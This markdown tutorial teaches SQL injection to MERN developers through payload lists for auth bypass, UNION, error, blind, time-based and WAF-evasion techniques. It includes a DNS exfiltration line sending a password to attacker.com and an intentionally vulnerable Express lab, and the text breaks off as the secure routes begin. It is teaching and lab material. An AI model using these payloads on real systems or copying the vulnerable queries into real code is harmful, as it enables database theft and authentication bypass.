# 💉 SQL Injection — Complete Notes + MERN Lab

### Every concept explained + hands-on code you can run right now

> **Your Setup:** You are a MERN developer learning security.
> This guide explains SQL Injection from zero, with Node.js/Express examples you already understand.
> Lab code runs immediately — no extra setup needed beyond MongoDB.

---

## 📚 Table of Contents

1. [What is SQL Injection — Really?](#1-what-is-sql-injection)
2. [Entry Point Detection](#2-entry-point-detection)
3. [DBMS Identification](#3-dbms-identification)
4. [Authentication Bypass](#4-authentication-bypass)
5. [UNION Based Injection](#5-union-based-injection)
6. [Error Based Injection](#6-error-based-injection)
7. [Blind Injection](#7-blind-injection)
8. [Time Based Injection](#8-time-based-injection)
9. [Out of Band (OAST)](#9-out-of-band)
10. [Second Order SQL Injection](#10-second-order-injection)
11. [WAF Bypass Techniques](#11-waf-bypass)
12. [MERN Lab — Full Vulnerable + Secure App](#12-mern-lab)
13. [How to Test with Burp Suite](#13-how-to-test-with-burp)
14. [Defense — Fix Every Vulnerability](#14-defense)

---

## 1. What is SQL Injection — Really?

### The Core Concept

As a MERN developer, you write JavaScript. But when you use a SQL database (MySQL, PostgreSQL), your JavaScript talks to a completely different language — SQL.

SQL Injection happens when **user input accidentally becomes SQL code** instead of just data.

### JavaScript Analogy You Already Know

```javascript
// You know eval() is dangerous in JS:
const userInput = "alert('hacked')"
eval(userInput) // Executes user's code!  ← DANGEROUS

// SQL Injection is the SAME concept but in SQL:
const email = req.body.email // "'; DROP TABLE users; --"
const query = `SELECT * FROM users WHERE email = '${email}'`
db.query(query) // Executes user's SQL code!  ← DANGEROUS
```

### Why This Happens

```
WHAT YOU INTEND:
  SQL = structure (code)
  User input = data

WHAT GOES WRONG:
  User input breaks out of "data" zone
  Becomes part of the "structure" (code)
  Database executes attacker's commands

ANALOGY:
  You write a letter: "Dear [NAME], you owe $100"
  If NAME = "Bob, actually you owe $0. Also ignore the $100 part"
  Letter reads: "Dear Bob, actually you owe $0. Also ignore the $100 part"
  The injected text changed the meaning!
```

### What Attackers Can Do

```
Read:    SELECT any data — passwords, credit cards, SSNs, all records
Write:   INSERT, UPDATE, DELETE any data
Execute: In some configs, run OS commands (xp_cmdshell in MSSQL)
Bypass:  Authentication — login without password
Destroy: DROP TABLE — delete entire database
```

---

## 2. Entry Point Detection

### What is an Entry Point?

An entry point is any place where user input reaches a SQL query. As a developer, you know these are:

```javascript
// All of these are potential entry points:
req.body.username // Form fields
req.query.id // URL: /users?id=5
req.params.userId // URL: /users/5
req.headers['x-user'] // HTTP headers
req.cookies.session // Cookies
```

### How Attackers Find Entry Points

They send special characters and watch what happens:

```
CHARACTER    WHAT IT DOES IN SQL
─────────────────────────────────────────────────────
'            Closes a string literal → may cause error
"            Same in some databases
;            Statement terminator → allows new query
)            Closes a parenthesis
--           Comment in SQL (ignores rest of line)
#            Comment in MySQL
/*           Start multi-line comment
```

### Detection Payloads (Test These Yourself)

```bash
# Test 1: Single quote — most basic test
# If you get a database error → possible SQLi!
curl "http://localhost:5000/api/users?id=1'"

# Test 2: Always true condition
# If response changes from id=1 → possible SQLi!
curl "http://localhost:5000/api/users?id=1 OR 1=1"

# Test 3: Always false condition
# If response is empty when 1=1 returned data → SQLi confirmed!
curl "http://localhost:5000/api/users?id=1 AND 1=2"

# Test 4: Comment out rest of query
curl "http://localhost:5000/api/users?id=1--"
curl "http://localhost:5000/api/users?id=1#"

# URL encoded versions (for WAF bypass):
# ' = %27
# ; = %3B
# space = %20
curl "http://localhost:5000/api/users?id=1%27"
```

### What to Look For

```
NORMAL response with id=1         → baseline
DIFFERENT response with id=1'     → possible injection
ERROR with id=1'                  → injection confirmed!
Database error message visible    → error-based SQLi possible
Same response as 1=1 with OR 1=1  → boolean SQLi confirmed
```

---

## 3. DBMS Identification

### Why Identify the Database?

Different databases have different SQL syntax. Once you know which database is running, you know exactly which payloads work.

### Keyword-Based Identification

```sql
-- Send these payloads, see which one doesn't cause an error:

-- MySQL specific functions:
conv('a',16,2)=conv('a',16,2)    -- only works in MySQL
crc32('MySQL')=crc32('MySQL')    -- MySQL specific

-- MSSQL specific:
@@CONNECTIONS>0                  -- SQL Server system variable
BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)

-- PostgreSQL specific:
5::int=5                         -- :: casting syntax is Postgres only
pg_client_encoding()=pg_client_encoding()

-- SQLite specific:
sqlite_version()=sqlite_version()
last_insert_rowid()>1

-- Oracle specific:
ROWNUM=ROWNUM                    -- Oracle's pseudo-column
RAWTOHEX('AB')=RAWTOHEX('AB')
```

### Error-Based Identification

Send a single quote `'` and read the error message:

```
ERROR MESSAGE                                    → DATABASE
─────────────────────────────────────────────────────────────────────────
"You have an error in your SQL syntax"          → MySQL
"ERROR: unterminated quoted string"             → PostgreSQL
"Unclosed quotation mark after the character"  → Microsoft SQL Server
"ORA-00933: SQL command not properly ended"    → Oracle
```

### Practical Example

```bash
# Send a quote and see what error comes back:
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email": "test'"'"'", "password": "test"}'

# MySQL error reveals the database type:
# "You have an error in your SQL syntax; check the manual
#  that corresponds to your MariaDB server version..."
```

---

## 4. Authentication Bypass

### How Login SQL Works

When you login to a website with SQL database, the query is usually:

```sql
SELECT * FROM users WHERE email = 'user@test.com' AND password = 'mypassword';
```

If a row is returned → login successful.
If no rows → wrong credentials.

### The Bypass

The attacker makes the WHERE condition ALWAYS TRUE:

```sql
-- Normal login:
SELECT * FROM users WHERE email = 'user@test.com' AND password = 'pass'

-- After injection in email field with: admin' OR '1'='1'--
SELECT * FROM users WHERE email = 'admin' OR '1'='1'--' AND password = 'anything'

-- Breaking it down:
-- email = 'admin'     → might be false (depends)
-- OR '1'='1'          → ALWAYS TRUE
-- --                  → comments out the password check!
-- Result: WHERE is true for every row → returns all users
-- First user returned = logged in as them!
```

### Authentication Bypass Payloads

```sql
-- In username/email field:
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin'--
admin' #
' OR 'x'='x
' OR 1=1 LIMIT 1--    ← Best one: only returns first user
admin'/*
') OR ('1'='1
' OR 'unusual'='unusual

-- In password field (when you know the username):
' OR '1'='1
anything' OR '1'='1
```

### The LIMIT Fix

```sql
-- Problem: OR 1=1 returns ALL users, which can cause errors
-- Fix for attacker: add LIMIT 1
' OR 1=1 LIMIT 1--

-- Now only first user returned = logged in as first user (often admin!)
```

### Raw MD5 Attack (Special Case)

This is a PHP-specific vulnerability but important to understand.

```php
// Vulnerable PHP code:
$sql = "SELECT * FROM admin WHERE pass = '".md5($password, true)."'";
//                                                          ^^^^
//                                    true = return RAW BINARY (not hex string!)
```

The raw binary output of certain MD5 inputs accidentally contains SQL syntax:

```
Input: ffifdyop
MD5 raw: 'or'6]!r,b   ← Contains 'or' which is SQL!

So the query becomes:
SELECT * FROM admin WHERE pass = ''or'6]!r,b'
This means: WHERE pass = '' OR something = 'something'
The OR makes it always true → bypass!
```

**Why this matters for you as a developer:**

- Never use `md5($input, true)` with SQL
- Never build SQL from hash outputs
- Always use parameterized queries

### Hashed Password Bypass via UNION

Modern apps hash passwords. But if SQL injection exists, attacker can inject their OWN hash:

```sql
-- Normal query:
SELECT id, username, password_hash FROM users WHERE username = 'input'

-- Attack: inject in username field:
admin' AND 1=0 UNION ALL SELECT 1,'admin','161ebd7d45089b3446ee4e0d86dbcf92'--

-- 1=0 makes original query return NOTHING
-- UNION injects a fake row with attacker-chosen hash
-- 161ebd7d45089b3446ee4e0d86dbcf92 = MD5("P@ssw0rd")
-- App compares: stored_hash == MD5(submitted_password)
-- Attacker submits "P@ssw0rd" → matches their injected hash → LOGIN!
```

---

## 5. UNION Based Injection

### What is UNION?

UNION combines results of two SELECT statements:

```sql
-- Normal:
SELECT name, price FROM products WHERE id = 1

-- With UNION:
SELECT name, price FROM products WHERE id = 1
UNION
SELECT username, password FROM users

-- Returns: product data + ALL user credentials combined!
```

### Rules for UNION Injection

```
RULE 1: Both queries must have SAME number of columns
RULE 2: Data types must be compatible
RULE 3: Attacker must first discover column count
```

### Step 1: Find Column Count

```sql
-- Method 1: ORDER BY (increment until error)
id=1 ORDER BY 1--    ← no error
id=1 ORDER BY 2--    ← no error
id=1 ORDER BY 3--    ← no error
id=1 ORDER BY 4--    ← ERROR! So there are 3 columns

-- Method 2: NULL injection (NULLs are compatible with any type)
id=1 UNION SELECT NULL--               ← 1 column test
id=1 UNION SELECT NULL,NULL--          ← 2 column test
id=1 UNION SELECT NULL,NULL,NULL--     ← 3 column test (no error = 3 columns)
```

### Step 2: Find Which Columns Are Visible

```sql
-- Replace NULLs with strings to see which column appears on page:
id=1 UNION SELECT 'VISIBLE1','VISIBLE2','VISIBLE3'--
-- Page shows "VISIBLE2" → second column is displayed on page
```

### Step 3: Extract Data

```sql
-- Get database version:
id=1 UNION SELECT NULL,version(),NULL--

-- Get database name:
id=1 UNION SELECT NULL,database(),NULL--

-- List all tables:
id=1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

-- List columns of a specific table:
id=1 UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get actual data:
id=1 UNION SELECT NULL,username,password FROM users--

-- Combine multiple columns into one (when only 1 visible column):
id=1 UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

### Visual Flow

```
Target query:
  SELECT product, price FROM items WHERE id = [INPUT]

Attacker sends: 1 UNION SELECT username, password FROM users--

Database runs:
  SELECT product, price FROM items WHERE id = 1
  UNION
  SELECT username, password FROM users--

Page shows:
  Original product + ALL usernames and passwords!
```

---

## 6. Error Based Injection

### What is Error Based Injection?

Instead of reading data from page output, you force the database to put data INSIDE the error message itself.

### How It Works

```sql
-- Force the database to convert a string to a number:
-- The "conversion error" will contain the value you're extracting!

-- PostgreSQL:
CAST((SELECT version()) AS integer)
-- Error: "invalid input syntax for type integer: 'PostgreSQL 14.5'"
-- The version string is in the error!

-- MySQL (using extractvalue):
AND extractvalue(1, concat(0x7e, (SELECT version())))
-- Error: "XPATH syntax error: '~8.0.31'"
-- The ~ and version is in the error!
```

### Common Error Based Payloads

```sql
-- MySQL - extractvalue():
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--

-- MySQL - updatexml():
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--

-- PostgreSQL - CAST():
' AND CAST((SELECT version()) AS integer)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS integer)--

-- MSSQL - convert():
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

### What You See

```
Normal page: "Product not found"
After injection:
"ERROR: invalid input syntax for type integer: 'PostgreSQL 14.5 on x86_64'"
                                                 ↑
                                    Database version leaked in error!
```

---

## 7. Blind Injection

### When Do You Use Blind Injection?

When the application:

- Shows NO error messages (errors hidden from user)
- Shows NO query output (values not displayed)
- Only shows: "found" or "not found", or changes page behavior

You're flying blind — you can't directly see data. Instead you ask the database yes/no questions.

### Boolean Based Injection

```sql
-- You ask: "Is the first character of the database name = 's'?"
-- True response = different page (e.g., "Welcome back!")
-- False response = different page (e.g., "User not found")

-- Step 1: Confirm vulnerability
id=1 AND 1=1    ← TRUE:  page loads normally
id=1 AND 1=2    ← FALSE: page changes or empty

-- Step 2: Extract data character by character
-- Is the database name's first character 's'?
id=1 AND SUBSTRING(database(),1,1)='s'--

-- Is it ASCII code 115 (which is 's')?
id=1 AND ASCII(SUBSTRING(database(),1,1))=115--

-- Use binary search to speed up:
id=1 AND ASCII(SUBSTRING(database(),1,1))>64--   ← >64? (a=97, 64 splits at '@')
id=1 AND ASCII(SUBSTRING(database(),1,1))>96--   ← >96? (above 96 = lowercase letters)
id=1 AND ASCII(SUBSTRING(database(),1,1))>115--  ← >115? NO → it's 115 = 's'!
```

### Visual Explanation

```
Target: Find database name (let's say it's "shop")

Question 1: LENGTH(database()) > 3?  → TRUE  (4 chars)
Question 2: LENGTH(database()) > 4?  → FALSE (exactly 4 chars!)
Question 3: SUBSTRING(database(),1,1) = 's'?  → TRUE  → 1st char = 's'
Question 4: SUBSTRING(database(),2,1) = 'h'?  → TRUE  → 2nd char = 'h'
Question 5: SUBSTRING(database(),3,1) = 'o'?  → TRUE  → 3rd char = 'o'
Question 6: SUBSTRING(database(),4,1) = 'p'?  → TRUE  → 4th char = 'p'

Result: database name = "shop"!

With binary search this is done in O(log n) instead of O(n) requests.
```

### Blind Error Based Injection

When you can't read data BUT you can see if an error occurred:

```sql
-- SQLite example:
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A--
-- WHEN true: returns 1, no error → page loads
-- WHEN false: json('') causes "malformed JSON" error → page errors

-- Usage to extract data:
' AND CASE WHEN (SELECT SUBSTR(sqlite_version(),1,1)='3') THEN 1 ELSE json('') END AND 'A'='A--
-- If TRUE (version starts with 3) → no error
-- If FALSE → error visible!
```

---

## 8. Time Based Injection

### What is Time Based Injection?

When you can't see ANY difference in the page (no errors, no visual change), you use timing. You make the database SLEEP for 5 seconds. If response is delayed → injection worked!

```sql
-- MySQL:
' AND SLEEP(5)--           ← Wait 5 seconds if vulnerable
' AND '1'='1' AND SLEEP(5) ← Only sleep when condition is true

-- MSSQL:
'; WAITFOR DELAY '00:00:05'--

-- PostgreSQL:
'; SELECT pg_sleep(5)--

-- SQLite:
' AND RANDOMBLOB(100000000)--    ← No sleep function, use heavy computation

-- Oracle:
' AND 1=dbms_pipe.receive_message(('a'),5)--
```

### Extract Data with Timing

```sql
-- "If first char of password is 'a', sleep 5 seconds"
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) FROM users WHERE username='admin'--

-- "If password is longer than 8 chars, sleep"
' AND IF(LENGTH(password)>8, SLEEP(5), 0) FROM users WHERE username='admin'--
```

### BENCHMARK for Timing (No SLEEP needed)

```sql
-- BENCHMARK(count, function) runs function many times
-- Makes CPU work hard = takes time = timing observable!

' AND BENCHMARK(5000000, MD5('test'))--
-- Runs MD5 5 million times = takes ~1 second

-- Used when SLEEP is blocked by WAF but BENCHMARK isn't
```

---

## 9. Out of Band

### When Normal Methods Fail

Sometimes:

- Page shows nothing (no output, no errors)
- Timing is unreliable (network latency too variable)
- Database can make outbound network connections

Solution: Make the database send data TO YOUR SERVER via DNS!

### DNS Exfiltration

```sql
-- MySQL: LOAD_FILE with UNC path (Windows)
LOAD_FILE('\\\\your-server.com\\x')
-- Database tries to resolve "your-server.com" via DNS
-- Your DNS server logs show the lookup = injection worked!
-- Can encode data in subdomain:

' UNION SELECT LOAD_FILE(concat('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\x'))--
-- Database looks up: [actualpassword].attacker.com
-- Your DNS logs show: hash123.attacker.com = password leaked!

-- MSSQL:
exec master..xp_dirtree '//your-server.com/a'

-- Oracle:
SELECT UTL_INADDR.get_host_address('your-server.com')
```

### Using Burp Collaborator

```
Burp Suite Pro has "Burp Collaborator" = your own DNS/HTTP server
1. Get a unique collaborator URL: xxxx.burpcollaborator.net
2. Use it in injection payload
3. Check "Collaborator" tab in Burp
4. If DNS lookup recorded → injection works!
5. Data appears in subdomain of lookup!
```

---

## 10. Second Order SQL Injection

### What Makes It Different?

First order: Input → SQL query (same request)
Second order: Input stored safely → Later used in different SQL query (delayed!)

```
Step 1: Attacker registers with username: admin'--
        App safely stores: "admin'--" in database (no injection YET)

Step 2: Attacker views their profile
        App queries: SELECT * FROM logs WHERE username = '[from DB]'
        DB returns: admin'-- from step 1
        Query becomes: SELECT * FROM logs WHERE username = 'admin'--'
        INJECTION HAPPENS NOW in different query!
```

### Why This is Tricky

```javascript
// Developer sanitizes input at login:
const safeUsername = sanitize(req.body.username)
db.query('INSERT INTO users SET username = ?', [safeUsername]) // ← Safe!

// But FORGETS to sanitize when using DB data later:
const user = await db.query('SELECT username FROM users WHERE id = ?', [id])
const username = user[0].username // Contains: admin'--

// Uses it unsafely in another query:
db.query(`SELECT * FROM logs WHERE user = '${username}'`) // ← INJECTION!
```

### Real CVE Example

CVE-2018-6376 in Joomla! was a second-order injection:

1. User saved a crafted username
2. That username was later used in an admin SQL query without sanitization
3. Full database compromise possible

---

## 11. WAF Bypass

### What is a WAF?

Web Application Firewall — blocks requests containing SQL keywords like:
`SELECT`, `UNION`, `DROP`, `INSERT`, spaces, etc.

### Bypass 1: No Spaces

WAF blocks: `UNION SELECT` (with space)

```sql
-- Use tab instead of space (%09):
UNION%09SELECT%091,2,3

-- Use newline (%0A):
UNION%0ASELECT%0A1,2,3

-- Use comments as spacer:
UNION/**/SELECT/**/1,2,3

-- Use parentheses:
UNION(SELECT(1),(2),(3))

-- Different whitespace chars:
%09 = TAB
%0A = Newline
%0D = Carriage return
%0C = Form feed
%A0 = Non-breaking space
```

### Bypass 2: No Commas

WAF blocks: `SELECT 1,2,3`

```sql
-- Use JOIN instead of comma in UNION:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- Use OFFSET instead of comma in LIMIT:
LIMIT 1 OFFSET 0    -- instead of LIMIT 0,1

-- Use FROM...FOR instead of comma in SUBSTR:
SUBSTRING('SQL' FROM 1 FOR 1)   -- instead of SUBSTRING('SQL',1,1)
```

### Bypass 3: No Equals Sign

WAF blocks: `WHERE role='admin'`

```sql
-- Use LIKE:
WHERE role LIKE 'admin'

-- Use BETWEEN:
WHERE role BETWEEN 'admin' AND 'admin'

-- Use NOT IN:
WHERE role NOT IN ('user','moderator')    -- leaves only admin!

-- Use REGEXP:
WHERE role REGEXP 'admin'
```

### Bypass 4: Case Sensitivity

WAF blocks: `union`, `select` (lowercase)

```sql
-- Mix cases:
UnIoN SeLeCt 1,2,3

-- Double keywords (some WAFs only remove one instance):
UNUNIONION SELSELECTECT 1,2,3
-- WAF removes inner "UNION SELECT" → leaves: UNION SELECT!

-- Use URL encoding:
%55%4e%49%4f%4e = UNION

-- Use SQL comments inside keywords (MySQL):
UN/**/ION SE/**/LECT 1,2,3
```

### Bypass 5: Operator Substitution

```sql
AND  → &&
OR   → ||
=    → LIKE, REGEXP, BETWEEN
>    → NOT BETWEEN 0 AND X
!=   → <>, NOT
WHERE → HAVING (in some cases)
```

---

## 12. MERN Lab — Full Vulnerable + Secure App

### Lab Overview

```
We build an Express API with:
  /api/vuln/*   → Intentionally vulnerable (practice attacks here)
  /api/secure/* → Fixed version (see how to defend)

We use MySQL for SQL injection practice
(MongoDB for NoSQL injection is separate)
```

### Setup

```bash
# Create lab folder
mkdir sqli-lab && cd sqli-lab

# Initialize
npm init -y

# Install dependencies
npm install express mysql2 bcryptjs jsonwebtoken cors dotenv

# Create .env file
cat > .env << EOF
PORT=5000
DB_HOST=localhost
DB_USER=root
DB_PASS=yourpassword
DB_NAME=sqli_lab
JWT_SECRET=mysecretkey
EOF
```

### Database Setup

```sql
-- Run these in MySQL:
CREATE DATABASE sqli_lab;
USE sqli_lab;

-- Users table
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  email VARCHAR(100) NOT NULL,
  password VARCHAR(255) NOT NULL,
  role VARCHAR(20) DEFAULT 'user',
  credit_card VARCHAR(20),
  ssn VARCHAR(15),
  balance DECIMAL(10,2) DEFAULT 0
);

-- Products table
CREATE TABLE products (
  id INT AUTO_INCREMENT PRIMARY KEY,
  name VARCHAR(100),
  price DECIMAL(10,2),
  category VARCHAR(50),
  hidden BOOLEAN DEFAULT FALSE
);

-- Orders table
CREATE TABLE orders (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT,
  product_id INT,
  amount DECIMAL(10,2),
  status VARCHAR(20)
);

-- Insert test data
INSERT INTO users VALUES
  (1, 'alice', 'alice@test.com', MD5('alice123'), 'user', '4111-1111-1111-1111', '123-45-6789', 5000.00),
  (2, 'bob', 'bob@test.com', MD5('bob456'), 'user', '4222-2222-2222-2222', '987-65-4321', 8000.00),
  (3, 'admin', 'admin@test.com', MD5('adminSecure!'), 'admin', NULL, NULL, 0.00);

INSERT INTO products VALUES
  (1, 'Laptop', 999.99, 'electronics', FALSE),
  (2, 'Phone', 599.99, 'electronics', FALSE),
  (3, 'Secret Item', 0.01, 'hidden', TRUE);   -- hidden=TRUE, shouldn't appear!

INSERT INTO orders VALUES
  (101, 1, 1, 999.99, 'delivered'),
  (102, 2, 2, 599.99, 'pending'),
  (103, 1, 2, 599.99, 'delivered');
```

### Main Server File

```javascript
// server.js
require('dotenv').config()
const express = require('express')
const app = express()

app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// Routes
app.use('/api/vuln', require('./routes/vulnerable'))
app.use('/api/secure', require('./routes/secure'))

app.get('/', (req, res) => {
  res.json({
    lab: 'SQL Injection Practice Lab',
    vulnerable_endpoints: {
      'POST /api/vuln/login': 'Authentication Bypass',
      'GET  /api/vuln/products': 'UNION Injection',
      'GET  /api/vuln/user': 'Blind Boolean Injection',
      'GET  /api/vuln/search': 'Error Based Injection',
      'GET  /api/vuln/time': 'Time Based Injection',
    },
    secure_endpoints: {
      'POST /api/secure/login': 'Fixed auth (parameterized)',
      'GET  /api/secure/products': 'Fixed query',
    },
  })
})

app.listen(5000, () => console.log('Lab running on :5000'))
```

### Vulnerable Routes

```javascript
// routes/vulnerable.js
const express = require('express')
const router = express.Router()
const mysql = require('mysql2/promise')

// Database connection
const db = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_NAME,
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 1: Authentication Bypass
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Normal login:
//     POST /api/vuln/login
//     Body: { "username": "alice", "password": "alice123" }
//
//   Attack (bypass without password):
//     Body: { "username": "admin'--", "password": "anything" }
//
//   Attack (login as first user):
//     Body: { "username": "' OR 1=1 LIMIT 1--", "password": "x" }

router.post('/login', async (req, res) => {
  const { username, password } = req.body

  // ❌ VULNERABLE: String concatenation!
  // The username is directly embedded into the SQL string.
  // If username = "admin'--" then:
  // WHERE username = 'admin'--' AND password = '...'
  // The -- comments out the password check!
  const query = `
    SELECT id, username, email, role
    FROM users
    WHERE username = '${username}'
    AND password = MD5('${password}')
  `

  console.log('[VULN] Executing query:', query) // See what runs!

  try {
    const [rows] = await db.execute(query)

    if (rows.length > 0) {
      res.json({
        success: true,
        message: `Logged in as: ${rows[0].username} (role: ${rows[0].role})`,
        user: rows[0],
        query_used: query, // Showing for educational purposes
      })
    } else {
      res.status(401).json({
        success: false,
        message: 'Invalid credentials',
        query_used: query,
      })
    }
  } catch (err) {
    // ❌ Also exposing error details!
    res.status(500).json({ error: err.message, query_used: query })
  }
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 2: UNION Injection (product search)
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Normal: GET /api/vuln/products?category=electronics
//
//   Attack - find column count:
//     /api/vuln/products?category=electronics' ORDER BY 1--
//     /api/vuln/products?category=electronics' ORDER BY 2--
//     /api/vuln/products?category=electronics' ORDER BY 3--  ← error = 3 cols
//
//   Attack - extract users table:
//     /api/vuln/products?category=electronics' UNION SELECT username,password,email FROM users--
//
//   Attack - get database version:
//     /api/vuln/products?category=' UNION SELECT version(),database(),user()--

router.get('/products', async (req, res) => {
  const { category } = req.query

  // ❌ VULNERABLE: category goes straight into query
  const query = `
    SELECT name, price, category
    FROM products
    WHERE category = '${category}' AND hidden = 0
  `

  console.log('[VULN] Executing:', query)

  try {
    const [rows] = await db.execute(query)
    res.json({
      results: rows,
      count: rows.length,
      query_used: query,
    })
  } catch (err) {
    res.status(500).json({ error: err.message, query_used: query })
  }
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 3: Error Based Injection
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Normal: GET /api/vuln/search?q=Laptop
//
//   Attack (error based - extract version):
//     /api/vuln/search?q=Laptop' AND extractvalue(1,concat(0x7e,version()))--
//
//   Attack (extract database name):
//     /api/vuln/search?q=Laptop' AND extractvalue(1,concat(0x7e,database()))--
//
//   Attack (list tables):
//     /api/vuln/search?q=' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--

router.get('/search', async (req, res) => {
  const { q } = req.query

  // ❌ VULNERABLE
  const query = `SELECT name, price FROM products WHERE name LIKE '%${q}%'`

  console.log('[VULN] Executing:', query)

  try {
    const [rows] = await db.execute(query)
    res.json({ results: rows, query_used: query })
  } catch (err) {
    // ❌ Error exposed to user = attacker reads the data from error!
    res.status(500).json({
      error: err.message, // ← Error contains extracted data!
      query_used: query,
    })
  }
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 4: Blind Boolean Injection
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Normal: GET /api/vuln/user?id=1
//
//   Confirm injection:
//     /api/vuln/user?id=1 AND 1=1    ← user found (true)
//     /api/vuln/user?id=1 AND 1=2    ← user NOT found (false)
//
//   Extract password length:
//     /api/vuln/user?id=1 AND LENGTH(password)>5--   ← true?
//     /api/vuln/user?id=1 AND LENGTH(password)>10--  ← true?
//     /api/vuln/user?id=1 AND LENGTH(password)=32--  ← MD5 is 32 chars!
//
//   Extract first char of password:
//     /api/vuln/user?id=1 AND ASCII(SUBSTRING(password,1,1))>96--
//     /api/vuln/user?id=1 AND ASCII(SUBSTRING(password,1,1))=49--  ← char '1'?

router.get('/user', async (req, res) => {
  const { id } = req.query

  // ❌ VULNERABLE: id in URL goes straight into query
  const query = `SELECT id, username, email FROM users WHERE id = ${id}`

  console.log('[VULN] Executing:', query)

  try {
    const [rows] = await db.execute(query)

    if (rows.length > 0) {
      // Attacker sees "found" vs "not found" to extract data!
      res.json({ found: true, user: rows[0] })
    } else {
      res.json({ found: false, message: 'User not found' })
    }
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 5: Time Based Injection
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Normal: GET /api/vuln/time?id=1  → fast response
//
//   Time injection (delays 5 seconds if vulnerable!):
//     /api/vuln/time?id=1 AND SLEEP(5)--
//
//   Extract data via timing:
//     /api/vuln/time?id=1 AND IF(database()='sqli_lab', SLEEP(5), 0)--
//     → 5 second delay = database name IS 'sqli_lab'
//
//   Extract username character by character:
//     /api/vuln/time?id=1 AND IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a',SLEEP(3),0)--

router.get('/time', async (req, res) => {
  const { id } = req.query

  // ❌ VULNERABLE: SLEEP can be injected!
  const query = `SELECT id, username FROM users WHERE id = ${id} LIMIT 1`

  console.log('[VULN] Executing:', query)

  const start = Date.now()
  try {
    const [rows] = await db.execute(query)
    const elapsed = Date.now() - start

    res.json({
      found: rows.length > 0,
      user: rows[0] || null,
      response_time_ms: elapsed, // Show timing — confirms injection!
      hint: elapsed > 3000 ? 'SLOW RESPONSE DETECTED - Sleep injection worked!' : 'Normal',
    })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

// ══════════════════════════════════════════════════════════════
// VULNERABLE 6: Second Order Injection
// ══════════════════════════════════════════════════════════════
// HOW TO TEST:
//   Step 1 - Store malicious username (stored safely):
//     POST /api/vuln/register
//     Body: { "username": "admin'--", "email": "evil@test.com", "password": "pass" }
//     → Registration succeeds! Input "safely" stored.
//
//   Step 2 - Trigger the injection:
//     GET /api/vuln/profile?email=evil@test.com
//     → Now the stored username is used UNSAFELY in another query!
//     → Injection happens in the profile endpoint, not registration!

let secondOrderUsers = [] // In-memory for demo

router.post('/register', async (req, res) => {
  const { username, email, password } = req.body

  // This looks safe because we use parameterized query here:
  const query = 'INSERT INTO users (username, email, password, role) VALUES (?, ?, MD5(?), "user")'

  try {
    const [result] = await db.execute(query, [username, email, password])

    res.json({
      success: true,
      message: 'Registered! Now try GET /api/vuln/profile?email=' + email,
      warning: 'Your username was stored as-is: "' + username + '"',
      next_step: 'The injection triggers in /profile, not here!',
    })
  } catch (err) {
    res.status(500).json({ error: err.message })
  }
})

router.get('/profile', async (req, res) => {
  const { email } = req.query

  // Step 1: Get user safely (parameterized)
  const safeQuery = 'SELECT username FROM users WHERE email = ?'
  const [users] = await db.execute(safeQuery, [email])

  if (!users.length) {
    return res.status(404).json({ error: 'User not found' })
  }

  const username = users[0].username // ← Contains: admin'--

  // Step 2: Use username UNSAFELY in another query = SECOND ORDER INJECTION!
  // ❌ DANGEROUS: username came from DB but not sanitized here!
  const unsafeQuery = `SELECT * FROM orders WHERE username = '${username}'`

  console.log('[SECOND ORDER] Query:', unsafeQuery)
  // If username = admin'-- then:
  // SELECT * FROM orders WHERE username = 'admin'--'
  // The -- comments out the closing quote = SQL SYNTAX ERROR / INJECTION!

  try {
    const [orders] = await db.execute(unsafeQuery)
    res.json({ username, orders, query_used: unsafeQuery })
  } catch (err) {
    res.status(500).json({
      error: err.message,
      query_used: unsafeQuery,
      explanation: 'Second order injection triggered! Username from DB injected here.',
    })
  }
})

module.exports = router
```

### Secure Routes (The Fix)

```javascript
// routes/secure.js
const express = require('express')
const router = express.Router()
const mysql = require('mysql2/promise')
const bcrypt = require('bcryptjs')

const db = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_NAME,
})

// ══════════════════════════════════════════════════════════════
// SECURE 1: Authentication (Parameterized Query)
// ══════════════════════════════════════════════════════════════
// The ? placeholders keep query structure and data SEPARATE.
// No matter what user sends, it can NEVER become SQL code.

router.post('/login', async (req, res) => {
  const { username, password } = req.body

  // ✅ SAFE: ? placeholders = parameterized query
